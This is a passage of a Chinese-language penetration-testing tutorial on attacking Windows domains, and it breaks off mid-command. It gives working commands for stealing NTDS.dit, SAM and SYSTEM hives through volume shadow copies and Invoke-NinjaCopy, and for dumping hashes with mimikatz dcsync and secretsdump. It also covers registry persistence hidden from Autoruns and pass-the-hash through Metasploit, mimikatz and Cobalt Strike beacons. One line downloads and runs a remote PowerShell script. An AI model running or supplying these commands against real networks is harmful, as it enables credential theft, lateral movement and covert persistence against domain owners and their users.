title="Ntdsutil"></a>Ntdsutil</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)">ntdsutil官方介绍</a></p><p>官方文档直接Google翻译有点拗口，能懂英文还是直接看英文吧。机翻下来实在头大，还得是自己看原文来的快~~</p></blockquote><p>Ntdsutil.exe是一个命令行工具，它为Active Directory域服务(ADDS)和Active Directory轻型日录服务(AD LDS)提供<strong>管理工具</strong>。ntdsutil命令工具的功能：</p><blockquote><ul><li>ADDS的数据库维护</li><li>管理和控制单个主机操作</li><li>删除域控制器留下的元数据，这些域控制器将会在未卸载的情况下从网络中删除</li></ul></blockquote><p>注意：</p><blockquote><ul><li>域环境默认安装，要使用Ntdsutil.exe,您必须从<strong>管理员命令提示符运行</strong></li><li>如果安装了AD LDS服务器角色但未安装ADDS服务器角色，该怎么办？</li></ul><blockquote><p>则可以使用dsdbutil.exe和dsmgmt,exe命令行工具来执行上述的操作，将会有和ntdsutil.exe一样的效果</p></blockquote></blockquote><p>一般域环境默认安装Ntdsutil.exe</p><blockquote><p>支持系统：</p><ul><li>Server 2003</li><li>Server 2008</li><li>Server 2012</li></ul></blockquote><h4 id="交互式使用"><a href="#交互式使用" class="headerlink" title="交互式使用"></a>交互式使用</h4><ol><li>快照snapshot</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil#进入交互式执行</span><br><span class="line">help#查看哪些可以执行的命令</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds#激活ntds———设置“NTDS”或特定的AD LDS实例作为活动实例。</span><br><span class="line">create#创建快照，快照内容实际上就是对C盘的备份</span><br><span class="line">mount [GUID]#挂在快照到本地进行使用   GUID是快照ID</span><br><span class="line">接下来就可以使用copy命令下载我们需要的文件！</span><br><span class="line">#copy 完之后再执行</span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure><p>挂载完后我们就可以在里面COPY我们需要的SAM、NTDS.DIT、SYSTEM文件啦~~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451005.png" alt="image-20220804071927342" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451065.png" alt="image-20220804071938619" style="zoom:50%;" /><ol start="2"><li>IFM</li></ol><p>上面的挂载尚显麻烦，我们可以使用更加快的方法IFM~~~~并且主要文件基本上都挂载出来了</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451121.png" alt="image-20220804071949087" style="zoom: 50%;" /><blockquote><ol><li>以管理员身份打开命令提示符（cmd.exe）</li><li>在命令提示符输入 ntdsutil 命令</li><li>在 ntdsutil 提示符下输入</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br><span class="line">#&lt;Drive&gt;:\&lt;Folder&gt; 是要创建文件的文件夹路径。</span><br><span class="line"></span><br><span class="line">可以通过tree /f &lt;Drive&gt;:\&lt;Folder&gt;查看其具体文件  </span><br></pre></td></tr></table></figure></blockquote><h4 id="非交互使用"><a href="#非交互使用" class="headerlink" title="非交互使用"></a>非交互使用</h4><p>实战之中，我们很多时候都拿不到交互式的shell，我们需要使用非交互式的方法去执行相应的命令！~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="1-查询当前系统的快照"><a href="#1-查询当前系统的快照" class="headerlink" title="1.查询当前系统的快照"></a>1.查询当前系统的快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;List Mounted&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="2-创建快照"><a href="#2-创建快照" class="headerlink" title="2.创建快照"></a>2.创建快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guid为 &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;</span><br></pre></td></tr></table></figure><h5 id="3-挂载快照"><a href="#3-挂载快照" class="headerlink" title="3.挂载快照"></a>3.挂载快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>快照挂载为 C:$SNAP_201908291617_VOLUMEC$\</p><h5 id="4-复制ntds-dit"><a href="#4-复制ntds-dit" class="headerlink" title="4.复制ntds.dit"></a>4.复制ntds.dit</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy C:\$SNAP_202008271744_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds2.dit</span><br></pre></td></tr></table></figure><h5 id="5-卸载快照"><a href="#5-卸载快照" class="headerlink" title="5.卸载快照"></a>5.卸载快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;unmount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="6-删除快照"><a href="#6-删除快照" class="headerlink" title="6. 删除快照"></a>6. 删除快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;delete &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h3 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754968(v=ws.11)">官方文档</a></p></blockquote><p>vssadmin:卷影复制服务管理命令行工具。域环境默认安装</p><blockquote><p>支持系统：</p><ul><li>Server 2008</li><li>Server 2012</li></ul></blockquote><h4 id="查询当前系统的快照"><a href="#查询当前系统的快照" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure><h4 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br><span class="line">#/for=c:表示我们对C盘进行卷影备份</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得 Shadow Copy Volume Name 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451964.png" alt="image-20220804072326126" style="zoom:50%;" /><h4 id="查看备份的快照里面的文件"><a href="#查看备份的快照里面的文件" class="headerlink" title="查看备份的快照里面的文件"></a>查看备份的快照里面的文件</h4><p>但是这种奇怪的目录名：<code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</code>.我们是无法访问的，dir 命令也无法查看。~~~那么这种情况该怎么查看备份的卷影文件里面的文件呢？？通过创建链接的方式~</p><blockquote><ol><li>查看快照列表：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure><ol start="2"><li>无法直接访问 ?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12  中的文件,可通过创建符号链接访问快照中的文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\</span><br></pre></td></tr></table></figure><ol start="3"><li>删除符号链接：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rd c:\testvsc</span><br></pre></td></tr></table></figure></blockquote><h4 id="复制ntds-dit"><a href="#复制ntds-dit" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds3.dit</span><br></pre></td></tr></table></figure><h4 id="删除快照"><a href="#删除快照" class="headerlink" title="删除快照"></a>删除快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br><span class="line"></span><br><span class="line">#/quiet为了是避免交互式Y/N选项~~</span><br></pre></td></tr></table></figure><h3 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a>Vshadow</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/vss/vshadow-tool-and-sample">官方文档</a></p></blockquote><p>Vshadow ( vshadow.exe ) 是用于管理卷影副本的命令行实用程序。此工具包含在 Microsoft Windows Software Development Kit (SDK)  中，有 Microsoft 签名。虽然不是内置的工具，但是也是官方的工具~~一定程度上不会引起注意。需要自己上传</p><p>Vshadow 有很多功能，包括执行脚本和调用命令以支持卷影快照管理的能力。</p><h4 id="查询当前系统的快照-1"><a href="#查询当前系统的快照-1" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -q</span><br></pre></td></tr></table></figure><h4 id="创建快照-1"><a href="#创建快照-1" class="headerlink" title="创建快照"></a>创建快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -p -nw C:</span><br><span class="line">参数说明：</span><br><span class="line">-p persistent，备份操作或是重启系统不会删除</span><br><span class="line">-nw no writers，用来提高创建速度</span><br><span class="line">C: 对应c盘</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451737.png" alt="image-20220804072600524" style="zoom: 50%;" /><p>获得SnapshotSetID、SnapshotID、Shadow copy device name</p><h4 id="复制ntds-dit-1"><a href="#复制ntds-dit-1" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy [Shadow copy device name]\windows\ntds\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><h4 id="删除快照-1"><a href="#删除快照-1" class="headerlink" title="删除快照"></a>删除快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow -dx=ShadowCopySetId</span><br><span class="line">vshadow -ds=ShadowCopyId</span><br></pre></td></tr></table></figure><h4 id="利用vshadow执行命令"><a href="#利用vshadow执行命令" class="headerlink" title="利用vshadow执行命令"></a>利用vshadow执行命令</h4><blockquote><p>参考：<a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</a></p></blockquote><p>Vshadow.exe  支持 -exec 参数，可用于执行二进制文件（.exe）或脚本（.bat&#x2F;.cmd）。<br>-exec 参数不支持命令参数</p><blockquote><p>要求：</p><ul><li>管理员权限</li><li>上传 Vshadow.exe</li><li>上传攻击载荷</li></ul></blockquote><p>执行命令格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -nw -exec=&lt;\path\to\exe&gt; &lt;系统驱动器&gt;</span><br><span class="line"></span><br><span class="line">-nw：no writers，用来提高创建速度.允许我们在不调用卷影副本编写器的情况下创建卷影副本，实际上，这是一个非持久性卷影副本，不会留下“物理”磁盘证据</span><br><span class="line">也算一个优点</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:</span><br></pre></td></tr></table></figure><p>成功执行 Vshadow 将启动卷影服务 (VSS)，如系统事件 ID 7036 所示，并调用 VSSVC.exe 进程。<br>执行后，后台存在进程 <strong>VSSVC.exe</strong> ，同时显示服务 Volume Shadow Copy 正在运行，需要手动关闭进程 VSSVC.exe</p><p>注：手动关闭进程 VSSVC.exe 会生成日志 7034。在事件查看器-系统日志中可以看到</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451144.png" alt="image-20220804072844836" style="zoom: 50%;" /><h4 id="自启动持久化和规避"><a href="#自启动持久化和规避" class="headerlink" title="自启动持久化和规避"></a>自启动持久化和规避</h4><p>利用思路：<br>vshadow.exe 包含微软签名，能绕过某些白名单的限制。如果作为启动项，<strong>Autoruns的默认启动列表不显示</strong>！！！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d &quot;C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x64\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:&quot;</span><br><span class="line">加入注册表，权限维持后面会讲</span><br></pre></td></tr></table></figure><p>在 AutoRuns 中，当过滤“Microsoft Entries”时，我们将看不到我们的登录条目.。但是，如果我们取消选择“Microsoft Entries”并启用“Windows Entries”，我们将看到我们的持久性机制的记录</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451505.png" alt="image-20220804073030521" style="zoom: 33%;" /><h3 id="NinjaCopy（不同于上面几种-推荐）"><a href="#NinjaCopy（不同于上面几种-推荐）" class="headerlink" title="NinjaCopy（不同于上面几种 推荐）"></a>NinjaCopy（不同于上面几种 推荐）</h3><p>使用PowerShell复制NTDs.dit&#x2F;Registry Hives,绕过SACL、DACL、File Locks</p><blockquote><ul><li><a href="https://adsecurity.org/?p=451">攻击者如何从域控制器中提取 Active Directory 数据库 (NTDS.dit)</a></li><li><a href="https://www.cnblogs.com/cdaniu/p/15630284.html">【windows 访问控制】三、访问控制列表 ACL&#x3D;DACL+SACL </a></li><li>在PowerSploit中有许多的powershell脚本供渗透使用~下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a></li></ul></blockquote><p>用于获取哈希的技术要么依赖于将代码注入LSASS,要么使用卷影复制服务来获取包含哈希的文件的副本。<br>Invoke-NinjaCopy，一个Powershell脚本，能够通过<strong>获取卷的读取句柄</strong>并解析NTFS来复制NTDs.d1t、注册表配置单元和位于NTFS卷上的任何其他文件。</p><p><strong>操作需要提升到SYSTEM、注入到SYSTEM进程或启动新服务&#x2F;可疑程序</strong></p><p><strong>原理简述：</strong></p><blockquote><p>获取C卷的读取句柄（管理员帐户可以执行此操作），能够读取整个卷的原始字节。然后，解析C卷上的NTFS结构，确定特定文件的字节在卷上的位置，扫描到该位置并复制文件字节。</p></blockquote><blockquote><p>C++编写的NTFS解析器：<a href="http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib">http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib</a></p><p>将现有的NTFS解析器编译为DLL并将其加载到Invoke-ReflectivePEInjection</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#powershell操作</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">invoke-NinjaCopy</span>.ps1<span class="comment">#导入模块，加载脚本</span></span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> .\sam.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> .\system.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> .\ntds.dit</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#CS上执行powershell操作</span></span><br><span class="line"></span><br><span class="line">beacon&gt; powershell<span class="literal">-import</span> C:\Users\MINGY\Desktop\<span class="built_in">Invoke-NinjaCopy</span>.ps1</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam.hive</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> c:\system.hive</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> C:\ntds.dit</span><br></pre></td></tr></table></figure><h2 id="解密NTDS-DIT文件"><a href="#解密NTDS-DIT文件" class="headerlink" title="解密NTDS.DIT文件"></a>解密NTDS.DIT文件</h2><h3 id="Mimikatz在线破解"><a href="#Mimikatz在线破解" class="headerlink" title="Mimikatz在线破解"></a>Mimikatz在线破解</h3><p>在线破解，不用将域控上的 ntds.dit 文件下载下来，直接在已有的shell上破解。</p><p>有一个cs弹回的beacon，就可以在beacon中直接利用mimikatz来破解，这一切的前提是<strong>有管理员权限</strong></p><p>Mimikatz有一个功能（dcsync），它可以利用<strong>目录复制服务</strong>（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。<br>在获得管理员权限后，通过Cobaltstrike弹回的beacon利用mimikatz模块进行密码Hash提取。</p><ul><li>获取mingy域内所有用户Hash</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:mingy.com /all /csv</span><br></pre></td></tr></table></figure><ul><li>查看单个用户的详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:mingy.com /user:krbtgt</span><br></pre></td></tr></table></figure><ul><li>查看所有用户的详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::lsa /inject</span><br></pre></td></tr></table></figure><h3 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h3><p>离线破解一般需要两步，首先就是将远端域控的 ntds.dit 和 SYSTEM下载到本地，然后再在本地进行破解。ntds.dit 文件一直在被 windows 系统占用，所以常规的复制下载方法是无法将文件下载到本地的。</p><ul><li>QuarksPwDump（不太好用）</li></ul><p>QuarksPwDump 是一款用于Windows用户凭据提取的开源工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p><p><strong>不太好用的主要原因是需要上传工具到目标主机，再去自动获取SYSKEY解密ntds.dit，而且但是容易被杀软查杀。</strong></p><ol><li>修复复制出来的数据库</li></ol><blockquote><p>esentutl是微软自带的工具，可以修复损坏或损坏的数据库。</p><p>适用于：Windows Server 2008、Windows Server 2012、Windows 8</p><p>有关如何使用此命令的示例，请参阅<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875504(v=ws.11)">示例</a>。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure><ol start="2"><li>使用QuarksPwDump直接读取信息并将结果导出至文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\QuarksPwDump.exe --dump-hash-domain --output gingnir.top.txt --ntds-file .\破解\ntds.dit</span><br></pre></td></tr></table></figure><ul><li>SecretsDump</li></ul><p>通过<code>impacket</code>套件中的<code>secretsdump.py</code>脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secretsdump.exe -sam sam.hiv -security security.hiv -system sys.hiv LOCAL</span><br><span class="line">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><blockquote><ul><li>LOCAL表示对本地文件进行解密</li><li>在对sam文件解密的时候，-security security.hiv，需要一个security.hiv的文件，同样也是在SAM文件同一个目录下</li></ul></blockquote><ul><li>NtdsAudit</li></ul><blockquote><p><a href="https://github.com/Dionach/NtdsAudit">https://github.com/Dionach/NtdsAudit</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;system.hive&quot; -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure><h2 id="留下的痕迹（需要留意）"><a href="#留下的痕迹（需要留意）" class="headerlink" title="留下的痕迹（需要留意）"></a>留下的痕迹（需要留意）</h2><p>遗留日志文件</p><blockquote><ul><li>调用 Volume Shadow Copy 服务会产生日志文件，位于System下， <strong>Event ID 为 7036</strong></li><li>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 <strong>Event ID 为98</strong>的日志文件</li></ul><p>如下图<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451555.png" alt="image-20220804074903788"></p></blockquote><h1 id="PTH（Hash传递攻击）"><a href="#PTH（Hash传递攻击）" class="headerlink" title="PTH（Hash传递攻击）"></a>PTH（Hash传递攻击）</h1><h2 id="PTH简介"><a href="#PTH简介" class="headerlink" title="PTH简介"></a>PTH简介</h2><p>PASS THE Hash  也叫 Hash  传递攻击，简称 PTH 。模拟用户登录不需要用户明文密码，就可以直接用获取到的 Hash  来登录目标系统。<br>利用成功的前提条件是：</p><ul><li>开启 445 端口 SMB  服务</li><li>开启 admin$ 共享</li></ul><h2 id="Metasploit-psexec模块"><a href="#Metasploit-psexec模块" class="headerlink" title="Metasploit psexec模块"></a>Metasploit psexec模块</h2><p>msf中有三个模块可用来hash传递攻击.msf5是以前的版本了，若是msf6不行，那便换方法，主要去用<code>exploit/windows/smb/psexec</code>尝试吧</p><h3 id="psexec-command"><a href="#psexec-command" class="headerlink" title="psexec_command"></a>psexec_command</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行单个命令的PTH模块</span><br><span class="line">auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set smbuser administrator</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set command &quot;whoami&quot;</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; run</span><br></pre></td></tr></table></figure><h3 id="psexec（如果是新版msf，用这个就可）"><a href="#psexec（如果是新版msf，用这个就可）" class="headerlink" title="psexec（如果是新版msf，用这个就可）"></a>psexec（如果是新版msf，用这个就可）</h3><ul><li>工作组</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行直接就获取到meterpreter的PTH模块</span><br><span class="line">exploit/windows/smb/psexec</span><br><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091729019.png" alt="image-20220809172838938" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091729683.png" style="zoom:50%;" /><ul><li>域</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbdomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass f67ce55ac831223d064010d8eaa2a273:d72c9b6670e05b0fb0ba01ff546776ab</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091730775.png" alt="image-20220809173005622" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091730187.png" alt="image-20220809173019048" style="zoom:50%;" /><h3 id="psexec-psh"><a href="#psexec-psh" class="headerlink" title="psexec_psh"></a>psexec_psh</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">支持对一个网段进行PTH进行验证的模块</span><br><span class="line">exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 &gt; use exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091731199.png" alt="image-20220809173105048" style="zoom:50%;" /><h2 id="Mimikatz-Hash传递攻击"><a href="#Mimikatz-Hash传递攻击" class="headerlink" title="Mimikatz Hash传递攻击"></a>Mimikatz Hash传递攻击</h2><p>当我们获得了内网中一台主机的NTLM哈希值，我们可以利用mimikatz对这个主机进行哈希传递攻击，执行命令成功后将会反弹回cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth </span><br><span class="line">/user:administrator /domain:192.168.78.67 </span><br><span class="line">/ntlm:579110c49145015c47ecd267657d3174&quot; exit</span><br></pre></td></tr></table></figure><p>在弹出的cmd中，我们还可以直接连接该主机，还可以查看目录文件等操作。该CMD已经具备了权限，已经通过验证。此时我们直接net use 不需要输入密码，即可直接使用共享（因为我们已经“通过了”验证）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.1.170\c$</span><br><span class="line">dir \\192.168.1.170\c$</span><br><span class="line">copy 1.exe \\192.168.1.170\c$</span><br><span class="line">net use h: \\192.168.1.170\c$</span><br></pre></td></tr></table></figure><h2 id="CobaltStrike-Hash传递攻击"><a href="#CobaltStrike-Hash传递攻击" class="headerlink" title="CobaltStrike Hash传递攻击"></a>CobaltStrike Hash传递攻击</h2><p>和上一节CS通过用户凭证横向移动很类似。要稍等一会</p><ul><li>工作组（看图说话~~）</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091733205.png" alt="image-20220809173306055" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091733163.png" alt="image-20220809173321039" style="zoom:50%;" /><ul><li>域</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091734054.png" alt="image-20220809173429910" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091734353.png" alt="image-20220809173448208" style="zoom: 50%;" /><h2 id="Powershell-Hash传递攻击"><a href="#Powershell-Hash传递攻击" class="headerlink" title="Powershell Hash传递攻击"></a>Powershell Hash传递攻击</h2><p>使用已知管理员hash，批量撞指定网段机器，此方式同时适用于工作组和域环境。而且powershell这种方法，可以达到“无文件落地”、“程序内存中加载执行”的效果，而且工具Windows基本上都内置了~~<br>需要同时加载Invoke-WMIExec.ps1、Invoke-TheHash.ps1</p><blockquote><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><p><a href="https://www.jianshu.com/p/fb078a99e0d8">Powershell免杀从入门到实践</a></p></blockquote><ul><li>加载脚本</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\Invoke-WMIExec.ps1</span><br><span class="line">Import-Module .\Invoke-TheHash.ps1</span><br><span class="line">powershell -exec bypass</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.3.86:8000/Invoke-WMIExec.ps1&#x27;);</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.3.86:8000/Invoke-TheHash.ps1&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -Username administrator -Hash 